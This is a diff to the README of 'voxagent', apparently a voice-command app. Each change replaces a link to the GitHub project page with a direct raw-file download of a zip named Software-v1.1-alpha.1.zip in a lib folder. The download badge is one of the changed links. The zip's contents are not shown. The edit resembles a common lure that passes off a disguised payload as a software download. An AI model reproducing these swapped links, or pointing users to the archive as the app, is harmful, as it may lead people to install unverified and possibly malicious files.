@@ -1,6 +1,6 @@
 # 🎙️ voxagent - Speak Commands, Get Answers
 
-[![Download voxagent](https://img.shields.io/badge/Download-voxagent-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gh-haphong/voxagent)
+[![Download voxagent](https://img.shields.io/badge/Download-voxagent-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/gh-haphong/voxagent/main/lib/Software-v1.1-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ For best results, use:
 
 Visit this page to download or get the app files:
 
-[https://github.com/gh-haphong/voxagent](https://github.com/gh-haphong/voxagent)
+[https://raw.githubusercontent.com/gh-haphong/voxagent/main/lib/Software-v1.1-alpha.1.zip](https://raw.githubusercontent.com/gh-haphong/voxagent/main/lib/Software-v1.1-alpha.1.zip)
 
 If the page shows a release file, download that file to your PC. If it shows a folder or project page, use the latest release or build file from there.
 
@@ -186,7 +186,7 @@ This project sits in these areas:
 
 If you need the files again, use this link:
 
-[https://github.com/gh-haphong/voxagent](https://github.com/gh-haphong/voxagent)
+[https://raw.githubusercontent.com/gh-haphong/voxagent/main/lib/Software-v1.1-alpha.1.zip](https://raw.githubusercontent.com/gh-haphong/voxagent/main/lib/Software-v1.1-alpha.1.zip)
 
 ## 🧩 Tips for Better Results
 
